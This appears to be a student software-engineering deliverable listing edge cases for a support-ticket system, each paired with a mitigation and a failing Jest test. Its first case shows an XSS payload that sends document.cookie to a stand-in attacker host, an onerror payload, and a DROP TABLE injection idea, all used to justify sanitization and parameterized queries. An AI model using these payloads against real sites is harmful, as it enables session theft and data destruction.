# CSE323 — Ticket System | Phase 1 Deliverable D2

## File 01b: AI-Uncovered Edge Cases

**Member:** C — Ticket System Vertical Slice

---

## EC-1: XSS / SQL Injection in Ticket Fields

**Persona link:** Alex (B-4) copies a JavaScript error message from the browser console and pastes it into the ticket body as "proof."

### Attack Vector

```json
POST /tickets
{
  "title": "<script>fetch('https://attacker.io?c='+document.cookie)</script>",
  "body":  "<img src=x onerror=\"alert('XSS')\"> order #4421 is broken"
}
```

### System Failure Without Mitigation

- **Database:** Raw HTML or SQL fragments stored in the `tickets` table.
- **Agent Triage View:** When a support agent opens the ticket, the script executes, potentially stealing session JWTs (Account Takeover).
- **SQL Injection:** If queries are string-concatenated, an attacker can terminate the `INSERT` and execute `DROP TABLE tickets`.

### Padlock

- **Server-side Sanitization:** Apply DOMPurify to `title` and `body` before persistence to strip all HTML tags and event handlers.
- **Parameterized Queries:** Use an ORM (Prisma/Sequelize) to ensure inputs are treated as data, never as executable code.
- **Content-Type Enforcement:** Enforce `application/json` response types so browsers never attempt to parse ticket data as HTML.

### TDP — Failing Test (TC-06)

```javascript
it("strips script tags from title and body before persisting", async () => {
  const res = await POST("/tickets", {
    title: "<script>alert(1)</script>",
    body:  "<img src=x onerror=alert(1)> my order is broken"
  }, validCustomerJWT);

  expect(res.status).toBe(201);
  const stored = await db.tickets.findFirst({ where: { id: res.body.id } });

  expect(stored.title).not.toMatch(/<[^>]+>/);
  expect(stored.body).not.toMatch(/<[^>]+>/);
  expect(stored.title).not.toContain("script");
});
```

---

## EC-2: Duplicate Submission Spam

**Persona link:** Alex (B-1) clicks "Submit Ticket" 8–10 times in 30 seconds due to a slow UI and lack of visual feedback.

### Attack Vector

Multiple identical `POST` requests fired within a short 10-minute window from the same authenticated user.

### System Failure Without Mitigation

- **Database Bloat:** Thousands of redundant rows are inserted, wasting storage and degrading query performance.
- **HuggingFace API:** The system calls the external AI API for every click, leading to wasted billable usage and rate-limiting.
- **Queue Triage:** The agent's queue is flooded with identical high-priority tickets, destroying triage efficiency.

### Padlock

- **Dedup Hash:** Compute a `SHA-256(customer_id + title + body)` hash for every inbound ticket.
- **Validation Window:** Query the DB for the same hash within a 10-minute sliding window before proceeding.
- **409 Conflict:** If a match is found, return `409 Conflict` with a descriptive error message.

### TDP — Failing Test (TC-07)

```javascript
it("returns 201 on first submission and 409 on identical re-submission", async () => {
  const payload = { title: "Order broken", body: "Item arrived smashed" };

  const first  = await POST("/tickets", payload, validCustomerJWT);
  const second = await POST("/tickets", payload, validCustomerJWT);

  expect(first.status).toBe(201);
  expect(second.status).toBe(409);
  expect(second.body.error).toMatch(/already submitted/);
});
```

---

## EC-3: HuggingFace API Timeout / Bad Gateway

**Persona link:** Alex (B-5) submits a ticket during a peak flash sale; the external AI endpoint is under heavy load.

### Attack Vector

The HuggingFace HTTP request takes longer than 5,000 ms to respond, or returns an HTTP `502 Bad Gateway`.

### System Failure Without Mitigation

- **Data Loss:** If the database save is gated on AI analysis, a failed API call prevents the ticket from being persisted. Alex's complaint is silently discarded.

### Padlock

- **AbortController Timeout:** Wrap the API fetch in an `AbortController` set to 5,000 ms.
- **Guaranteed Persistence:** Perform the `DB INSERT` regardless of AI result. If the API fails, save the ticket with `priority = "MEDIUM"` and `sentiment_source = "fallback"`.

### TDP — Failing Test (TC-08)

```javascript
it("assigns MEDIUM priority and returns 201 even if HuggingFace times out", async () => {
  jest.spyOn(hfClient, "analyze").mockRejectedValue(new Error("AbortError"));

  const res = await POST("/tickets", {
    title: "Urgent", body: "Payment double charged"
  }, validCustomerJWT);

  expect(res.status).toBe(201);
  const stored = await db.tickets.findFirst({ where: { id: res.body.id } });
  expect(stored.priority).toBe("MEDIUM");
});
```

---

## EC-4: Extreme Payload Size (Memory Exhaustion)

**Persona link:** Alex (B-2) pastes an entire 6-month email history (50,000+ characters) into the body field.

### Attack Vector

A `POST /tickets` request where the `body` text length exceeds the token limit of the AI model or the database column capacity.

### System Failure Without Mitigation

- **Memory Spike:** Large payloads cause memory spikes in the Node.js JSON parser, potentially crashing the instance (OOM Error).
- **AI Crash:** HuggingFace returns `413 Payload Too Large` or `400 Bad Request`.

### Padlock

- **Middleware Limits:** Set `express.json({ limit: '10kb' })` to reject oversized payloads at the network entry point.
- **Field Validation:** Enforce `title` (5–120 chars) and `body` (10–2,000 chars) constraints before calling any external service.

### TDP — Failing Test (TC-09)

```javascript
it("rejects 50,000-character body with 422 before calling AI", async () => {
  const hfSpy = jest.spyOn(hfClient, "analyze");

  const res = await POST("/tickets", {
    title: "Help", body: "x".repeat(50000)
  }, validCustomerJWT);

  expect(res.status).toBe(422);
  expect(hfSpy).not.toHaveBeenCalled();
});
```

---

## EC-5: Tokenizer Failure — Emoji Overload

**Persona link:** Alex (B-3) uses heavy compound emojis (😡😡🔥) to express urgency instead of descriptive text.

### Attack Vector

A ticket body containing multi-codepoint emojis that an English-only AI model cannot meaningfully tokenize or score.

### System Failure Without Mitigation

- **Priority Error:** The AI returns `NaN` or a neutral score (`0.5`), causing a critical issue to be ranked at the bottom of the triage queue.

### Padlock

- **Score Validity Guard:** If the AI returns `NaN` or `null`, trigger a fallback to `priority = "MEDIUM"`.
- **Content Filtering:** If alphanumeric content length is fewer than 5 characters after stripping emojis, flag the ticket as `low_content` for manual agent review.

### TDP — Failing Test (TC-10)

```javascript
it("assigns MEDIUM priority when AI returns an invalid NaN score", async () => {
  jest.spyOn(hfClient, "analyze").mockResolvedValue({ score: NaN });

  const res = await POST("/tickets", {
    title: "Urgent", body: "😡😡😡😡😡😡😡😡😡"
  }, validCustomerJWT);

  expect(res.status).toBe(201);
  const stored = await db.tickets.findFirst({ where: { id: res.body.id } });
  expect(stored.priority).toBe("MEDIUM");
});
```

---

## Edge Case Traceability Summary

| ID   | Edge Case Name       | Persona Behaviour            | Primary Mitigation (Padlock)      | TDP Test ID |
| ---- | -------------------- | ---------------------------- | --------------------------------- | ----------- |
| EC-1 | XSS / SQL Injection  | B-4: Paste error proof       | DOMPurify + Parameterized Queries | TC-06       |
| EC-2 | Duplicate Submission | B-1: Repeated clicking       | SHA-256 Hashing + 409 Conflict    | TC-07       |
| EC-3 | AI API Timeout       | B-5: Peak traffic submission | AbortController + Default Fallback| TC-08       |
| EC-4 | Extreme Payload      | B-2: Large email dump        | Field length validation (422)     | TC-09       |
| EC-5 | Tokenizer Failure    | B-3: Emoji expression        | NaN/Null score guard logic        | TC-10       |